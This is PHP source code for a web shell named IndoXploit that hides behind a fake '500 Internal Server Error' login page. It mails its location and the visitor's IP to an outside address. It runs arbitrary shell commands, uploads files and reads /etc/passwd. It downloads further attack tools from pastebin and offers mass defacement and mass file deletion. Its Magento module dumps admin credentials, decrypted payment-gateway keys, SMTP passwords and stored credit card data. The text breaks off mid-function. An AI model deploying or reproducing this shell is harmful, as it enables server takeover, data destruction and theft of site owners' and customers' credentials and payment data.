<?php
@session_start(); 
@error_reporting(0); 
@error_log(0);
@ini_set('error_log',NULL); 
@ini_set('log_errors',0); 
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0); 
@ini_set('display_errors', 0);
@set_time_limit(0); 
@set_magic_quotes_runtime(0);
$lol="506137fa61b7e9eebd030d3db5cd9644"; 
$tujuanmail = 'aqilnaila23@gmail.com';
$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
$pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
mail($tujuanmail, "Dont Change This!!", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
function printLogin() { 
    ?> 
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>500 Internal Server Error</title>
</head><body>
<h1>Internal Server Error</h1>
<p>The server encountered an internal error or
misconfiguration and was unable to complete
your request.</p>
<p>Please contact the server administrator and inform them of the time the error occurred,
and anything you might have done that may have
caused the error.</p>
<p>More information about this error may be available
in the server error log.</p>
</body></html>

<br>
<br>
<br>
<br>
<br>
</style>
</head>	
    <style> 
        input { margin:0;background-color:#fff;border:1px solid #fff; } 
    </style> 
    <center>  
    <form method=post> 
    <input type=password name=tokeichun> 
    </form></center> 
    <?php 
    exit; 
} 
if( !isset( $_SESSION[md5($_SERVER['HTTP_HOST'])] )) 
    if( empty( $lol ) || 
        ( isset( $_POST['tokeichun'] ) && ( md5($_POST['tokeichun']) == $lol ) ) ) 
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true; 
    else 
        printLogin();
if(isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['act'] == 'download')) {
	@ob_clean();
	$file = $_GET['file'];
	header('Content-Description: File Transfer');
	header('Content-Type: application/octet-stream');
	header('Content-Disposition: attachment; filename="'.basename($file).'"');
	header('Expires: 0');
	header('Cache-Control: must-revalidate');
	header('Pragma: public');
	header('Content-Length: ' . filesize($file));
	readfile($file);
	exit;
} 	
	
?>
<html>
<head>
<title></title>
<meta name='author' content='IndoXploit Recoded By Mr.ToKeiChun69'>
<meta charset="UTF-8">
<style type='text/css'>
@import url(https://fonts.googleapis.com/css?family=Abel);
html {
	background: #000000;
	color: #ffffff;
	font-family: 'Abel';
	font-size: 13px;
	width: 100%;
}
li {
	display: inline;
	margin: 5px;
	padding: 5px;
}
table, th, td {
	border-collapse:collapse;
	font-family: Tahoma, Geneva, sans-serif;
	background: transparent;
	font-family: 'Abel';
	font-size: 13px;
}
.table_home, .th_home, .td_home {
	border: 1px solid #ffffff;
}
th {
	padding: 10px;
}
a {
	color: #ffffff;
	text-decoration: none;
}
a:hover {
	color: gold;
	text-decoration: underline;
}
b {
	color: gold;
}
input[type=text], input[type=password],input[type=submit] {
	background: transparent; 
	color: #ffffff; 
	border: 1px solid #ffffff; 
	margin: 5px auto;
	padding-left: 5px;
	font-family: 'Abel';
	font-size: 13px;
}
textarea {
	border: 1px solid #ffffff;
	width: 100%;
	height: 400px;
	padding-left: 5px;
	margin: 10px auto;
	resize: none;
	background: transparent;
	color: #ffffff;
	font-family: 'Abel';
	font-size: 13px;
}
select {
	background: transparent; 
	color: #ffffff; 
	border: 1px solid #ffffff; 
	margin: 5px auto;
	padding-left: 5px;
	font-family: 'Abel';
	font-size: 13px;
}
.but {
	background: transparent; 
	color: #ffffff; 
	border: 1px solid #ffffff; 
	margin: 5px auto;
	padding-left: 5px;
	font-family: 'Abel';
	font-size: 13px;
}
</style>
</head>
<?php
if (file_exists("php.ini")){
}else{
$img = fopen('php.ini', 'w');
$sec = "safe_mode = OFF
disable_funtions = NONE";
fwrite($img ,$sec);
fclose($img);}		
function w($dir,$perm) {
	if(!is_writable($dir)) {
		return "<font color=red>".$perm."</font>";
	} else {
		return "<font color=lime>".$perm."</font>";
	}
}
    function UrlLoop($url,$type){

        $urlArray = array();

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $result = curl_exec($ch);

        $regex='|<a.*?href="(.*?)"|';
        preg_match_all($regex,$result,$parts);
        $links=$parts[1];
        foreach($links as $link){
            array_push($urlArray, $link);
        }
        curl_close($ch);

        foreach($urlArray as $value){
            $lol="$url$value";
			if(preg_match("#$type#is", $lol)) {
				echo "$lol\r\n";
			}
        }
    }
function exe($cmd) { 	
if(function_exists('system')) { 		
		@ob_start(); 		
		@system($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} elseif(function_exists('exec')) { 		
		@exec($cmd,$results); 		
		$buff = ""; 		
		foreach($results as $result) { 			
			$buff .= $result; 		
		} return $buff; 	
	} elseif(function_exists('passthru')) { 		
		@ob_start(); 		
		@passthru($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} elseif(function_exists('shell_exec')) { 		
		$buff = @shell_exec($cmd); 		
		return $buff; 	
	} 
}
function perms($file){
$perms = fileperms($file);
if (($perms & 0xC000) == 0xC000) {
$info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
$info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
$info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
$info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
$info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
$info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
$info = 'p';
} else {
$info = 'u';
}
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
(($perms & 0x0800) ? 's' : 'x' ) :
(($perms & 0x0800) ? 'S' : '-'));
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
(($perms & 0x0400) ? 's' : 'x' ) :
(($perms & 0x0400) ? 'S' : '-'));
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
(($perms & 0x0200) ? 't' : 'x' ) :
(($perms & 0x0200) ? 'T' : '-'));
return $info;
}
function hdd($s) {
if($s >= 1073741824)
return sprintf('%1.2f',$s / 1073741824 ).' GB';
elseif($s >= 1048576)
return sprintf('%1.2f',$s / 1048576 ) .' MB';
elseif($s >= 1024)
return sprintf('%1.2f',$s / 1024 ) .' KB';
else
return $s .' B';
}
function ambilKata($param, $kata1, $kata2){
    if(strpos($param, $kata1) === FALSE) return FALSE;
    if(strpos($param, $kata2) === FALSE) return FALSE;
    $start = strpos($param, $kata1) + strlen($kata1);
    $end = strpos($param, $kata2, $start);
    $return = substr($param, $start, $end - $start);
    return $return;
}
if(get_magic_quotes_gpc()) {
	function idx_ss($array) {
		return is_array($array) ? array_map('idx_ss', $array) : stripslashes($array);
	}
	$_POST = idx_ss($_POST);
}
function CreateTools($names,$lokasi){
	if ( $_GET['create'] == $names ){
		$a= "".$_SERVER['SERVER_NAME']."";
$b= dirname($_SERVER['PHP_SELF']);
$c = "/tools/".$names.".php";
if (file_exists('tools/'.$names.'.php')){
	echo '<script type="text/javascript">alert("Done");window.location.href = "tools/'.$names.'.php";</script> ';
	}
	else {mkdir("tools", 0777);
file_put_contents('tools/'.$names.'.php', file_get_contents($lokasi));
echo ' <script type="text/javascript">alert("Done");window.location.href = "tools/'.$names.'.php";</script> ';}}}

CreateTools("wso","http://pastebin.com/raw/3eh3Gej2");
CreateTools("adminer","https://www.adminer.org/static/download/4.2.5/adminer-4.2.5.php");
CreateTools("b374k","http://pastebin.com/raw/rZiyaRGV");
CreateTools("scanner","https://pastebin.com/raw/N6iBqjEA");
CreateTools("injection","http://pastebin.com/raw/nxxL8c1f");
CreateTools("promailerv2","http://pastebin.com/raw/Rk9v6eSq");
CreateTools("vhost","https://pastebin.com/raw/zDgukLLX");
CreateTools("grabber","https://pastebin.com/raw/HrHwKMyH");
CreateTools("gamestopceker","http://pastebin.com/raw/QSnw1JXV");
CreateTools("bukapalapak","http://pastebin.com/raw/6CB8krDi");
CreateTools("tokopedia","http://pastebin.com/dvhzWgby");
CreateTools("encodedecode","http://pastebin.com/raw/wqB3G5eZ");
CreateTools("mailer","http://pastebin.com/raw/9yu1DmJj");
CreateTools("r57","http://pastebin.com/raw/G2VEDunW");
CreateTools("tokenpp","http://pastebin.com/raw/72xgmtPL");
CreateTools("extractor","http://pastebin.com/raw/dBYyB7S5");
CreateTools("bh","http://pastebin.com/raw/A8TupKkC");
CreateTools("dhanus","http://pastebin.com/raw/W99Pvk3C");
if(isset($_GET['dir'])) {
	$dir = $_GET['dir'];
	chdir($_GET['dir']);
} else {
	$dir = getcwd();
}
$dir = str_replace("\\","/",$dir);
$scdir = explode("/", $dir);
$sm = (@ini_get(strtolower("safe_mode")) == 'on') ? "<font color=red>ON</font>" : "<font color=lime>OFF</font>";
$ling="http://".$_SERVER['SERVER_NAME']."".$_SERVER['PHP_SELF']."?create";
$ds = @ini_get("disable_functions");
$mysql = (function_exists('mysql_connect')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$curl = (function_exists('curl_version')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$wget = (exe('wget --help')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$perl = (exe('perl --help')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$python = (exe('python --help')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$show_ds = (!empty($ds)) ? "<font color=red>$ds</font>" : "<font color=lime>NONE</font>";
if(!function_exists('posix_getegid')) {
	$user = @get_current_user();
	$uid = @getmyuid();
	$gid = @getmygid();
	$group = "?";
} else {
	$uid = @posix_getpwuid(posix_geteuid());
	$gid = @posix_getgrgid(posix_getegid());
	$user = $uid['name'];
	$uid = $uid['uid'];
	$group = $gid['name'];
	$gid = $gid['gid'];
}
$d0mains = @file("/etc/named.conf");
			$users=@file('/etc/passwd');
        if($d0mains)
        { 
			$count;  
			foreach($d0mains as $d0main)
			{
				if(@ereg("zone",$d0main))
				{
					preg_match_all('#zone "(.*)"#', $d0main, $domains);
					flush();
					if(strlen(trim($domains[1][0])) > 2)
					{
						flush();
						$count++;
			   		} 
			   	}
			}
		}

$sport=$_SERVER['SERVER_PORT'];
echo "<table style='width:100%'>";
echo "<tr><td>System: <font color=lime>".php_uname()."</font></td></tr>";
echo "<tr><td>User: <font color=lime>".$user."</font> (".$uid.") Group: <font color=lime>".$group."</font> (".$gid.")</td></tr>";
echo "<tr><td>Server IP: <font color=lime>".gethostbyname($_SERVER['HTTP_HOST'])."</font> | Your IP: <font color=lime>".$_SERVER['REMOTE_ADDR']."</font></td></tr>";
echo "<tr><td>HDD: <font color=lime>".hdd(disk_free_space("/"))."</font> / <font color=lime>".hdd(disk_total_space("/"))."</font></td></tr>";
echo "<tr><td>Websites :<font color=lime> $count </font> Domains</td></tr>";
echo "<tr><td>Port :<font color=lime>  $sport</font> </td></tr>";
echo "<tr><td>Safe Mode: $sm</td></tr>";
echo "<tr><td>Disable Functions: $show_ds</td></tr>";

echo "<tr><td>MySQL: $mysql | Perl: $perl | Python: $python | WGET: $wget | CURL: $curl </td></tr>";
echo "<tr><td>Current DIR: ";
foreach($scdir as $c_dir => $cdir) {	
	echo "<a href='?dir=";
	for($i = 0; $i <= $c_dir; $i++) {
		echo $scdir[$i];
		if($i != $c_dir) {
		echo "/";
		}
	}
	echo "'>$cdir</a>/";
}
echo "&nbsp;&nbsp;[ ".w($dir, perms($dir))." ]<br>";
echo "<form method='post'>
	<font style='text-decoration: none;'> ~ $ </font>
	<input type='text' size='20' height='10' name='cmd'><input type='submit' name='do_cmd' value='X'>
	</form>";
	if($_POST['do_cmd']) {
		echo "<pre>".exe($_POST['cmd'])."</pre>";
	}
if($_POST['upload']) {
		if($_POST['tipe_upload'] == 'biasa') {
			if(@copy($_FILES['ix_file']['tmp_name'], "$dir/".$_FILES['ix_file']['name']."")) {
				$act = "<font color=lime>Uploaded!</font> at <i><b>$dir/".$_FILES['ix_file']['name']."</b></i>";
			} else {
				$act = "<font color=red>failed to upload file</font>";
			}
		} else {
			$root = $_SERVER['DOCUMENT_ROOT']."/".$_FILES['ix_file']['name'];
			$web = $_SERVER['HTTP_HOST']."/".$_FILES['ix_file']['name'];
			if(is_writable($_SERVER['DOCUMENT_ROOT'])) {
				if(@copy($_FILES['ix_file']['tmp_name'], $root)) {
					$act = "<font color=lime>Uploaded!</font> at <i><b>$root -> </b></i><a href='http://$web' target='_blank'>$web</a>";
				} else {
					$act = "<font color=red>failed to upload file</font>";
				}
			} else {
				$act = "<font color=red>failed to upload file</font>";
			}
		}
	}
	echo "
	<form method='post' enctype='multipart/form-data'>
	<input type='radio' name='tipe_upload' value='biasa' checked>  ".w($dir,"Current")." 
	<input type='radio' name='tipe_upload' value='home_root'>  ".w($_SERVER['DOCUMENT_ROOT'],"Home")." 
	<input type='file' name='ix_file'>
	<input type='submit' value='upload' name='upload'>
	</form>";
	echo $act;

	
echo "<hr>";
echo "<center>";
echo "<ul>";
echo "<li>[ <a href='?'>Home</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=upload'>Upload</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=cmd'>Command</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=mass_deface'>Mass Deface</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=config'>Config</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=symconfig'>Config 2</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=jumping'>Jumping</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=salto'>Emboh</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=backup'>Emboh 2</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=backups'>Emboh 3</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=symlink'>Symlink</a> ]<br></li>";
echo "<li>[ <a href='?dir=$dir&do=cpanel'>CPanel Crack</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=cpftp_auto'>CPanel/FTP Auto Deface</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=smtp'>SMTP Grabber</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=zoneh'>Zone-H</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=defacerid'>Defacer.ID</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=cgi'>CGI Telnet</a> ]</li><br>";
echo "<li>[ <a href='?dir=$dir&do=adminer'>Adminer</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=fake_root'>Fake Root</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=auto_edit_user'>Auto Edit User</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=auto_wp'>Auto Edit Title WordPress</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=auto_dwp'>WP Auto Deface</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=auto_dwp2'>WP Auto Deface V.2</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=auto_cu_wp'>WP Auto Edit User V.2</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=auto_cu_joomla'>Joomla Auto Edit User V.2</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=passwbypass'>Bypasser</a> ]<br></li>";
echo "<li>[ <a href='?dir=$dir&do=loghunter'>Log Hunter</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=shellchk'>Shell Checker</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=shelscan'>Shell Finder</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=tool'>Tools</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=zip'>Zip Menu</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=about'>About</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=symlink404'>Bypass Symlink 404</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=magen'>Magento DB Info</a> ]</li><br>";
echo "<li>[ <a href='?dir=$dir&do=metu'>LogOut</a> ]<br></li>";
echo "</ul>";
echo "</center>";
echo "<hr>";
if($_GET['do'] == 'upload') {
	echo "<center>";
	if($_POST['upload']) {
		if($_POST['tipe_upload'] == 'biasa') {
			if(@copy($_FILES['ix_file']['tmp_name'], "$dir/".$_FILES['ix_file']['name']."")) {
				$act = "<font color=lime>Uploaded!</font> at <i><b>$dir/".$_FILES['ix_file']['name']."</b></i>";
			} else {
				$act = "<font color=red>failed to upload file</font>";
			}
		} else {
			$root = $_SERVER['DOCUMENT_ROOT']."/".$_FILES['ix_file']['name'];
			$web = $_SERVER['HTTP_HOST']."/".$_FILES['ix_file']['name'];
			if(is_writable($_SERVER['DOCUMENT_ROOT'])) {
				if(@copy($_FILES['ix_file']['tmp_name'], $root)) {
					$act = "<font color=lime>Uploaded!</font> at <i><b>$root -> </b></i><a href='http://$web' target='_blank'>$web</a>";
				} else {
					$act = "<font color=red>failed to upload file</font>";
				}
			} else {
				$act = "<font color=red>failed to upload file</font>";
			}
		}
	}
	echo "Upload File:
	<form method='post' enctype='multipart/form-data'>
	<input type='radio' name='tipe_upload' value='biasa' checked>Biasa [ ".w($dir,"Writeable")." ] 
	<input type='radio' name='tipe_upload' value='home_root'>home_root [ ".w($_SERVER['DOCUMENT_ROOT'],"Writeable")." ]<br>
	<input type='file' name='ix_file'>
	<input type='submit' value='upload' name='upload'>
	</form>";
	echo $act;
	echo "</center>";
} 
 elseif($_GET['do'] == 'cmd') {
	if($_POST['do_cmd']) {
		echo "<pre>".exe($_POST['cmd'])."</pre>";
	}
} elseif($_GET['do'] == 'mass_deface') {
	echo "<center><form action=\"\" method=\"post\">\n";
	$dirr=$_POST['d_dir'];
	$index = $_POST["script"];
	$index = str_replace('"',"'",$index);
	$index = stripslashes($index);
	function edit_file($file,$index){
		if (is_writable($file)) {
		clear_fill($file,$index);
		echo "<Span style='color:green;'><strong> [+] Nyabun 100% Successfull </strong></span><br></center>";
		} 
		else {
			echo "<Span style='color:red;'><strong> [-] Ternyata Tidak Boleh Menyabun Disini :( </strong></span><br></center>";
			}
			}
	function hapus_massal($dir,$namafile) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					if(file_exists("$dir/$namafile")) {
						unlink("$dir/$namafile");
					}
				} elseif($dirb === '..') {
					if(file_exists("".dirname($dir)."/$namafile")) {
						unlink("".dirname($dir)."/$namafile");
					}
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							if(file_exists($lokasi)) {
								echo "[<font color=lime>DELETED</font>] $lokasi<br>";
								unlink($lokasi);
								$idx = hapus_massal($dirc,$namafile);
							}
						}
					}
				}
			}
		}
	}
	function clear_fill($file,$index){
		if(file_exists($file)){
			$handle = fopen($file,'w');
			fwrite($handle,'');
			fwrite($handle,$index);
			fclose($handle);  } }

	function gass(){
		global $dirr , $index ;
		chdir($dirr);
		$me = str_replace(dirname(__FILE__).'/','',__FILE__);
		$files = scandir($dirr) ;
		$notallow = array(".htaccess","error_log","_vti_inf.html","_private","_vti_bin","_vti_cnf","_vti_log","_vti_pvt","_vti_txt","cgi-bin",".contactemail",".cpanel",".fantasticodata",".htpasswds",".lastlogin","access-logs","cpbackup-exclude-used-by-backup.conf",".cgi_auth",".disk_usage",".statspwd","..",".");
		sort($files);
		$n = 0 ;
		foreach ($files as $file){
			if ( $file != $me && is_dir($file) != 1 && !in_array($file, $notallow) ) {
				echo "<center><Span style='color: #8A8A8A;'><strong>$dirr/</span>$file</strong> ====> ";
				edit_file($file,$index);
				flush();
				$n = $n +1 ;
				} 
				}
				echo "<br>";
				echo "<center><br><h3>$n Kali Anda Telah Ngecrot  Disini </h3></center><br>";
					}
	function ListFiles($dirrall) {

    if($dh = opendir($dirrall)) {

       $files = Array();
       $inner_files = Array();
       $me = str_replace(dirname(__FILE__).'/','',__FILE__);
       $notallow = array($me,".htaccess","error_log","_vti_inf.html","_private","_vti_bin","_vti_cnf","_vti_log","_vti_pvt","_vti_txt","cgi-bin",".contactemail",".cpanel",".fantasticodata",".htpasswds",".lastlogin","access-logs","cpbackup-exclude-used-by-backup.conf",".cgi_auth",".disk_usage",".statspwd","Thumbs.db");
        while($file = readdir($dh)) {
            if($file != "." && $file != ".." && $file[0] != '.' && !in_array($file, $notallow) ) {
                if(is_dir($dirrall . "/" . $file)) {
                    $inner_files = ListFiles($dirrall . "/" . $file);
                    if(is_array($inner_files)) $files = array_merge($files, $inner_files);
                } else {
                    array_push($files, $dirrall . "/" . $file);
                }
            }
			}

			closedir($dh);
			return $files;
		}
	}
	function gass_all(){
		global $index ;
		$dirrall=$_POST['d_dir'];
		foreach (ListFiles($dirrall) as $key=>$file){
			$file = str_replace('//',"/",$file);
			echo "<center><strong>$file</strong> ===>";
			edit_file($file,$index);
			flush();
		}
		$key = $key+1;
	echo "<center><br><h3>$key Kali Anda Telah Ngecrot  Disini  </h3></center><br>"; }
	function sabun_massal($dir,$namafile,$isi_script) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					file_put_contents($lokasi, $isi_script);
				} elseif($dirb === '..') {
					file_put_contents($lokasi, $isi_script);
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							echo "[<font color=lime>DONE</font>] $lokasi<br>";
							file_put_contents($lokasi, $isi_script);
							$idx = sabun_massal($dirc,$namafile,$isi_script);
						}
					}
				}
			}
		}
	}
	if($_POST['mass'] == 'onedir') {
		echo "<br> Versi Text Area<br><textarea style='background:black;outline:none;color:red;' name='index' rows='10' cols='67'>\n";
		$ini="http://";
		$mainpath=$_POST[d_dir];
		$file=$_POST[d_file];
		$dir=opendir("$mainpath");
		$code=base64_encode($_POST[script]);
		$indx=base64_decode($code);
		while($row=readdir($dir)){
		$start=@fopen("$row/$file","w+");
		$finish=@fwrite($start,$indx);
		if ($finish){
			echo"$ini$row/$file\n";
			}
		}
		echo "</textarea><br><br><br><b>Versi Text</b><br><br><br>\n";
		$mainpath=$_POST[d_dir];$file=$_POST[d_file];
		$dir=opendir("$mainpath");
		$code=base64_encode($_POST[script]);
		$indx=base64_decode($code);
		while($row=readdir($dir)){$start=@fopen("$row/$file","w+");
		$finish=@fwrite($start,$indx);
		if ($finish){echo '<a href="http://' . $row . '/' . $file . '" target="_blank">http://' . $row . '/' . $file . '</a><br>'; }
		}

	}
	elseif($_POST['mass'] == 'sabunkabeh') { gass(); }
	elseif($_POST['mass'] == 'hapusmassal') { hapus_massal($_POST['d_dir'], $_POST['d_file']); }
	elseif($_POST['mass'] == 'sabunmematikan') { gass_all(); }
	elseif($_POST['mass'] == 'massdeface') {
		echo "<div style='margin: 5px auto; padding: 5px'>";
		sabun_massal($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
		echo "</div>";	}
	else {
		echo "
		<center><font style='text-decoration: underline;'>
		Select Type:<br>
		</font>
		<select class=\"select\" name=\"mass\"  style=\"width: 450px;\" height=\"10\">
		<option value=\"onedir\">Mass Deface 1 Dir</option>
		<option value=\"massdeface\">Mass Deface ALL Dir</option>
		<option value=\"sabunkabeh\">Sabun Massal Di Tempat</option>
		<option value=\"sabunmematikan\">Sabun Massal Bunuh Diri</option>
		<option value=\"hapusmassal\">Mass Delete Files</option></center></select><br>
		<font style='text-decoration: underline;'>Folder:</font><br>
		<input type='text' name='d_dir' value='$dir' style='width: 450px;' height='10'><br>
		<font style='text-decoration: underline;'>Filename:</font><br>
		<input type='text' name='d_file' value='readthis.html' style='width: 450px;' height='10'><br>
		<font style='text-decoration: underline;'>Index File:</font><br>
		<textarea name='script' style='width: 450px; height: 200px;'>Hacked By Mr.ToKeiChun69</textarea><br>
		<input type='submit' name='start' value='Mass Deface' style='width: 450px;'>
		</form></center>";
		}
	}
elseif($_GET['do'] == 'magen') {
echo'
<div id="page-wrap">  
<center>  
<br>  
<FORM action=""  method="post">  
<div align="center">[M A G E N T O] - Stealing Information<br>  
<div align="center">coder: sohai & n4KuLa_<br>  
<input type="hidden" name="form_action" value="2">  
</div>  
</div>  
';  


if(file_exists($_SERVER['DOCUMENT_ROOT'].'/app/etc/local.xml')){  
    $xml = simplexml_load_file($_SERVER['DOCUMENT_ROOT'].'/app/etc/local.xml');  
    if(isset($xml->global->resources->default_setup->connection)) {  
       $connection = $xml->global->resources->default_setup->connection;  
       $prefix = $xml->global->resources->db->table_prefix;  
       $key = $xml->global->crypt->key; //f8cd1881e3bf20108d5f4947e60acfc1  
       require_once $_SERVER['DOCUMENT_ROOT'].'/app/Mage.php';  
         
       try {  
           $app = Mage::app('default');  
           Mage::getSingleton('core/session', array('name'=>'frontend'));  
       }catch(Exception $e) { echo 'Message: ' .$e->getMessage()."<br/>\n";}  

       if (!mysql_connect($connection->host, $connection->username, $connection->password)){  
           print("Could not connect: " . mysql_error());  
       }  
       mysql_select_db($connection->dbname);  
       echo $connection->host."|".$connection->username."|".$connection->password."|".$connection->dbname."| $prefix | $key<br/>\n";  

    $crypto = new Varien_Crypt_Mcrypt();  
    $crypto->init($key);  

    //=========================================================================================================  
    $query = mysql_query("SELECT user_id,firstname,lastname,email,username,password FROM admin_user where is_active = '1'");  
    if (!$query){  
          echo "<center><b>Gagal</b></center>";  
    }else{  
            $site = mysql_fetch_array(mysql_query("SELECT value as website FROM core_config_data WHERE path='web/unsecure/base_url'"));  
          echo'<br><br>  
                ====================================================================<br>  
                                [ Admin FROM website : '.$site['website'].'] <br>  
                ====================================================================<br>';  
    }  
    echo "  
    <table border='1' align='center' >  
    <tr>  
    <td>id</td>  
    <td>firstname</td>  
    <td>lastname</td>  
    <td>email</td>  
    <td>username</td>  
    <td>password</td>  
    </tr>";  
        while($vx = mysql_fetch_array($query)) {  
        $no = 1;  
        $user_id = $vx['user_id'];  
        $username = $vx['username'];  
        $password = $vx['password'];  
        $email = $vx['email'];  
        $firstname = $vx['firstname'];  
        $lastname = $vx['lastname'];  
        echo "<tr><pre><td>$user_id</td><td>$firstname</td><td>$lastname</td><td>$email</td><td>$username</td><td>$password</td></pre></tr>";  
        }   
    echo "</table><br>";  
    //=========================================================================================================  
    $query = mysql_query("SELECT value as user,(SELECT value FROM core_config_data where  path = 'payment/authorizenet/trans_key') as pass FROM core_config_data where path = 'payment/authorizenet/login'");  
    if(mysql_num_rows($query) != 0){  
        if (!$query){  
              echo "<center><b>Gagal</b></center>";  
        }else{  
              echo'<br><br>  
                    ====================================================================<br>  
                                    [ Authorizenet ] <br>  
                    ====================================================================<br>';  
        }  
        echo "  
        <table border='1' align='center' >  
        <tr>  
        <td>no</td>  
        <td>user</td>  
        <td>pass</td>      
        </tr>";  
            $no = 1;  
            while($vx = mysql_fetch_array($query)) {  
            $user = $crypto->decrypt($vx['user']);  
            $pass = $crypto->decrypt($vx['pass']);  

              
            echo "<tr><pre><td>$no</td><td>$user</td><td>$pass</td></pre></tr>";  
            $no++;  
            }   
        echo "</table><br>";  
    }  
    //=========================================================================================================  
    $query_smtp = mysql_query("SELECT (SELECT a.value FROM core_config_data as a WHERE path = 'system/smtpsettings/host') as host , (SELECT b.value FROM core_config_data as b WHERE path = 'system/smtpsettings/port') as port,(SELECT c.value FROM core_config_data as c WHERE path = 'system/smtpsettings/username') as user ,(SELECT d.value FROM core_config_data as d WHERE path = 'system/smtpsettings/password') as pass FROM core_config_data limit 1,1");  
    if(mysql_num_rows($query_smtp) != 0){  
        if (!$query_smtp){  
              echo "<center><b>Gagal</b></center>";  
        }else{  
              echo'<br><br>  
                    ====================================================================<br>  
                                    [ SMTP ] <br>  
                    ====================================================================<br>';  
        }  
        echo "  
        <table border='1' align='center' >  
        <tr>  
        <td>no</td>  
        <td>host</td>          
        <td>port</td>  
        <td>user</td>  
        <td>pass</td>      
        </tr>";  
            $no = 1;  
            $batas = 0;  
            while($rows = mysql_fetch_array($query_smtp)) {  
                $smtphost = $rows[0];  
                $smtpport = $rows[1];  
                $smtpuser = $rows[2];  
                $smtppass = $rows[3];  
                echo "<tr><pre><td>$no</td><td>$smtphost</td><td>$smtpport</td><td>$smtpuser</td><td>$smtppass</td></pre></tr>";  
                $no++;  
            }  
        echo "</table><br>";  
    }  
    //=========================================================================================================  
    $query = mysql_query("SELECT sfo.updated_at,sfo.cc_owner,sfo.method,sfo.cc_number_enc,sfo.cc_cid_enc,CONCAT(sfo.cc_exp_month,' |',sfo.cc_exp_year) as exp,CONCAT(billing.firstname,' | ',billing.lastname,' | ',billing.street,' | ',billing.city,' | ', billing.region,' | ',billing.postcode,' | ',billing.country_id,' | ',billing.telephone,' |-| ',billing.email) AS 'Billing Address' FROM sales_flat_quote_payment AS sfo JOIN sales_flat_quote_address AS billing ON billing.quote_id = sfo.quote_id AND billing.address_type = 'billing'");  
    $query2 = mysql_query("SELECT sfo.cc_owner,sfo.method,sfo.cc_number_enc,sfo.cc_cid_status,CONCAT(sfo.cc_exp_month,'|',sfo.cc_exp_year) as exp,CONCAT(billing.firstname,' | ',billing.lastname,' | ',billing.street,' | ',billing.city,' | ', billing.region,' | ',billing.postcode,' | ',billing.country_id,' | ',billing.telephone,' | ',billing.email) AS 'Billing Address' FROM sales_flat_order_payment AS sfo JOIN sales_flat_order_address AS billing ON billing.parent_id = sfo.parent_id AND billing.address_type = 'billing' where cc_number_enc != ''");
    if(mysql_num_rows($query) != 0 || mysql_num_rows($query2) != 0){  
          echo'<br><br>  
